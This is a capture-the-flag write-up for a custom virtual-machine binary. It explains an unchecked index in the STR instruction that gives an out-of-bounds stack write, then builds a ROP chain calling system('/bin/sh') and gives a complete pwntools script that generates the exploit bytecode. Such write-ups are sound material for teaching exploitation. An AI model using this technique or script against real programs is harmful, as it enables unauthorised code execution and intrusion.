
---

# VM Challenge Writeup

## Vulnerability Analysis

The challenge implements a custom stack-based Virtual Machine. The `VM` structure is allocated on the stack in `main`. The vulnerability lies in the **`STR` (Store)** instruction (Opcode 2).

```c
case 2: // STR: Store Register to Memory
  // ... checks bounds of bytecode ...
  uVar5 = *(uint32_t *)(vm->bytecode + vm->ip); // Read 32-bit Index
  vm->ip = vm->ip + 4;
  uVar2 = vm->bytecode[vm->ip]; // Read Register Index
  vm->ip = vm->ip + 1;
  Exec_Str(vm,uVar5,uVar2); // vm.memory[uVar5] = vm.regs[uVar2]
  break;

```

The `Exec_Str` function uses `uVar5` as an index into the `vm.memory` array without validating if it falls within the bounds of the allocated memory. Since the `VM` struct (and its memory) resides on the stack, providing a large index allows for an **Out-of-Bounds (OOB) Write**, enabling us to overwrite the saved return address of the `main` function.

## Exploit Steps

To exploit this, we generate a custom bytecode file that constructs a ROP chain on the stack using the VM's `MOV` and `STR` instructions.

### 1. Primitive: Arbitrary Stack Write

We define a helper pattern in the bytecode to write 64-bit values (addresses) onto the stack. Since the VM operates on 32-bit integers, we must split every 64-bit address into two 32-bit writes.

1. **MOV** value (Lower 32 bits) into Register 0.
2. **STR** Register 0 into `vm.memory[Index]`.
3. **MOV** value (Upper 32 bits) into Register 0.
4. **STR** Register 0 into `vm.memory[Index + 1]`.

### 2. Offset Calculation

By debugging (or fuzzing), we determine that index **265** in the `vm.memory` array corresponds to the location of the Return Address (RIP) on the stack.

### 3. ROP Chain Construction

We overwrite the return address with a standard ROP chain to execute `system("/bin/sh")`.

* **Gadget 1: `pop rdi; ret**`
* Loads the address of the command string into the `RDI` register (first argument for `system`).


* **Argument: `/bin/sh**`
* The address of the string `"/bin/sh"` found within the binary.


* **Gadget 2: `ret**`
* A simple return gadget used to align the stack to 16 bytes (required by `glibc` `system` calls to avoid crashes).


* **Function: `system@plt**`
* Calls the system function.



### 4. Execution

The program executes our bytecode. It performs the memory writes, effectively placing our ROP chain where the return address should be. When `main` returns (or when `VM_Run` returns, depending on the exact stack frame layout), execution flow redirects to our chain, spawning a shell.

```python
# Conceptual Bytecode Logic
# Writing POP_RDI (0x4012fa) to Offset 265
MOV R0, 0x004012fa  # Lower 32 bits
STR [265], R0       # Write to stack
MOV R0, 0x00000000  # Upper 32 bits
STR [266], R0       # Write to stack
# ... Repeat for /bin/sh addr, RET gadget, and system addr ...

```

## Exploit Script
Here is the final solution:

```python
from pwn import *

filename = 'exploit.bin'

POP_RDI     = 0x4012fa      # pop rdi ; ret
BIN_SH      = 0x40207e      # Address of "/bin/sh"
SYSTEM_PLT  = 0x401184      # Address of system@plt
RET_GADGET  = 0x40101a      # Your found ret gadget

OFFSET_IDX  = 265

OP_MOV = 0x00
OP_STR = 0x02

bytecode = b""

def emit_mov(reg_idx, val_32):
    global bytecode
    bytecode += p8(OP_MOV)
    bytecode += p8(reg_idx)
    bytecode += p32(val_32)

def emit_str(mem_idx, reg_idx):
    global bytecode
    bytecode += p8(OP_STR)
    bytecode += p32(mem_idx)
    bytecode += p8(reg_idx)

def write_addr_to_stack(start_index, address):
    low_32  = address & 0xFFFFFFFF
    high_32 = (address >> 32) & 0xFFFFFFFF

    emit_mov(0, low_32)         # Reg[0] = low_32
    emit_str(start_index, 0)    # Memory[idx] = Reg[0]

    emit_mov(0, high_32)        # Reg[0] = high_32 (0)
    emit_str(start_index + 1, 0)# Memory[idx+1] = Reg[0]

idx = OFFSET_IDX

write_addr_to_stack(idx, POP_RDI)
idx += 2

write_addr_to_stack(idx, BIN_SH)
idx += 2

write_addr_to_stack(idx, RET_GADGET)
idx += 2

write_addr_to_stack(idx, SYSTEM_PLT)
idx += 2

with open(filename, "wb") as f:
    f.write(bytecode)

print(f"[+] Fixed bytecode generated: {len(bytecode)} bytes")
print(f"[+] The 'Invalid opcode 32' error should be gone.")
print(f"[+] Run: ./virtual {filename} CTF{{test}}")
```
